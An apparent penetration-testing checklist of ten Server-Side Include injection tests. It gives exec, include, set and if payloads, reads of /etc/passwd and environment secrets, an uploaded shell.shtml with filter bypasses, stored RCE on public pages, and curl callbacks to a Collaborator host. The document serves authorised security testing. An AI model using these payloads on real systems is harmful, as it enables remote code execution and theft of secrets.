1. Test for SSI injection with <!--#echo-->
Steps:

Find any input that gets reflected in the HTML response: name field, search box, profile bio, comment, address field
Inject: <!--#echo var="DATE_LOCAL" -->
Submit the form, navigate to where the value is rendered (profile page, search results, etc.)
Check if the raw SSI tag appears, or if it's been processed into an actual date string like Wednesday, 01-Jul-2026 10:30:00 IST
Also try: <!--#echo var="DOCUMENT_NAME" -->, <!--#echo var="SERVER_SOFTWARE" -->, <!--#echo var="REMOTE_ADDR" -->
Try URL-encoded version if < is being filtered: %3C!--#echo var="DATE_LOCAL" --%3E

Vulnerable When:

Instead of seeing the raw SSI tag in the page, you see the actual date/time or server variable value rendered
<!--#echo var="SERVER_SOFTWARE" --> returns Apache/2.4.41 (Ubuntu) — confirms SSI is processing your input
Server is Apache with .shtml extension or SSI enabled for .html

Severity: Medium (info disclosure, escalation path to higher severity)

2. Test for SSI injection with <!--#include-->
Steps:

In any reflected input field, inject: <!--#include virtual="/etc/passwd" -->
Also try: <!--#include file="../../../../etc/passwd" --> — file uses relative path, virtual uses server root
Try app source: <!--#include virtual="/index.php" -->, <!--#include virtual="/config.php" -->
If Linux target, try: <!--#include virtual="/proc/self/environ" --> — may expose env variables including secrets
Encode < if needed: %3C!--#include virtual="/etc/passwd" --%3E

Vulnerable When:

/etc/passwd contents appear in the page response (file read confirmed)
App source code disclosed via <!--#include virtual="/index.php" -->
Environment variables exposed — may contain DB passwords, API keys, secret keys

Severity: High

3. Test for SSI injection with <!--#exec-->
Steps:

In any reflected field, inject: <!--#exec cmd="id" -->
Submit and render the page — look for output like uid=33(www-data) gid=33(www-data)
Try: <!--#exec cmd="whoami" -->, <!--#exec cmd="hostname" -->, <!--#exec cmd="uname -a" -->
For blind exec (no output): <!--#exec cmd="curl https://your-collaborator.burpcollaborator.net" --> — check Collaborator
If cmd is blocked, try CGI: <!--#exec cgi="/cgi-bin/test.sh" -->
Check Apache config — exec requires Options +Includes AND Option IncludesNOEXEC must NOT be set

Vulnerable When:

uid=33(www-data) or similar output in the page (RCE confirmed)
Collaborator receives HTTP request from server (blind RCE confirmed)
Any OS command output visible in response

Severity: Critical (RCE)

4. Test for SSI injection in file upload with .shtml extension
Steps:

Find a file upload feature (avatar, attachment, document upload)
Create a file named shell.shtml with content: <!--#exec cmd="id" -->
Upload it — check if server renames it or rejects .shtml extension
If renamed, try: shell.shtml.jpg (double extension), shell.SHTML (case variation), shell.shtml%00.jpg (null byte)
After upload, navigate to the uploaded file's URL (e.g., https://target.com/uploads/shell.shtml)
Check if the page returns uid=33(www-data) instead of raw file content

Vulnerable When:

Server serves .shtml files through the SSI processor instead of as raw text
Visiting the uploaded file URL returns command output
Extension filter bypassed via double extension or case variation, resulting in executed SSI

Severity: Critical

5. Test for SSI injection in user-generated content
Steps:

Find persistent input: forum post, product review, user bio, blog comment, ticket description
Submit: <!--#exec cmd="id" --> as the content
Navigate to the page where content is rendered (forum thread, product page)
Check if raw SSI tag appears or is executed
Also try less suspicious payloads first: <!--#echo var="DATE_LOCAL" --> to confirm SSI processing without triggering alerts
If stored and executed, every visitor to that page triggers the SSI directive

Vulnerable When:

Stored SSI directive executes when the page is viewed (by you or any other visitor)
id output appears on the public page — affects all users who visit
Confirmed stored/persistent RCE impacting all visitors

Severity: Critical (Stored RCE)

6. Test for SSI injection in error pages
Steps:

Try accessing a URL that includes SSI in the path: https://target.com/<!--#exec cmd="id" -->/notfound
Trigger a 404 error with SSI in the URL path — check if error page reflects and processes it
Also try: https://target.com/404?message=<!--#exec cmd="id" -->
Submit invalid form input to trigger validation error — inject SSI in the input that appears in the error message
Check 403, 500 error pages — do any reflect user input?

Vulnerable When:

Error page shows uid=33(www-data) instead of the raw SSI tag
URL path or query parameter reflected in error page gets SSI-processed
Server processes SSI in custom error documents (ErrorDocument 404 /error.shtml)

Severity: High

7. Test for SSI injection in search results
Steps:

Go to the search feature, search for: <!--#echo var="DATE_LOCAL" -->
Check the search results page — does it show the raw text or the actual current date?
Then try: <!--#exec cmd="id" -->
If < is filtered in the search box, try encoded: %3C!--#exec cmd="id" --%3E
Also check if the search term appears in the page title or meta tags — these may also go through SSI processing
Try searching for <!--#include virtual="/etc/passwd" --> if exec is blocked

Vulnerable When:

Search results page shows current date/time instead of your literal SSI tag (confirms SSI processing on search output)
Command output like www-data appears in search results
Server processes SSI in the page that renders search query reflections

Severity: High

8. Test for SSI injection in email templates
Steps:

Find any feature that sends an email using your input: contact form (name/message), "invite a friend" (name), password reset (username display), order confirmation (custom message)
In the name or message field, inject: <!--#exec cmd="id" -->
Trigger the email action (submit contact form, request password reset)
Check the email you receive — does it show uid=33(www-data) in the email body where your name/message should appear?
Also try: <!--#echo var="SERVER_SOFTWARE" --> to disclose server version in email
If blind (no email received by you), use Collaborator in cmd: <!--#exec cmd="curl https://your-collaborator.burpcollaborator.net" -->

Vulnerable When:

Email body contains uid=33(www-data) instead of your injected literal text
Collaborator receives HTTP request triggered by the email rendering
Server renders email templates through SSI processor before sending

Severity: High

9. Test for SSI injection with <!--#set--> directives
Steps:

Inject: <!--#set var="test" value="ssi_works" --><!--#echo var="test" -->
Check if ssi_works appears in the response — this confirms SSI processing without needing exec
Then try command substitution in value: <!--#set var="out" value="id" --><!--#echo var="out" -->
If that works, try: <!--#set var="out" value="cat /etc/passwd" --><!--#echo var="out" -->
Chain set + include: set var to a path and use it: <!--#set var="f" value="/etc/passwd" --><!--#include virtual="${f}" -->

Vulnerable When:

ssi_works appears in page instead of raw SSI text (SSI is processing)
Command substitution in value executes and output appears in response
Chained set + include reads arbitrary files

Severity: High

10. Test for SSI injection with <!--#if--> directives
Steps:

Inject: <!--#if expr="1=1" -->SSI_WORKS<!--#endif -->
Check if SSI_WORKS appears in the response — confirms conditional SSI processing
Now test boolean logic: <!--#if expr="1=2" -->NO<!--#else -->YES<!--#endif --> — should render YES
Use it to enumerate server info conditionally: <!--#if expr="${SERVER_SOFTWARE} = /Apache/" -->apache_confirmed<!--#endif -->
If output is different based on condition, you have a conditional SSI oracle — can enumerate server-side variables without full output

Vulnerable When:

SSI_WORKS appears where your injected text should be (confirms #if processing)
YES/NO renders correctly based on condition logic
You can conditionally extract server variables — info disclosure / stepping stone to RCE via #exec

Severity: Medium (info disclosure, escalation path)

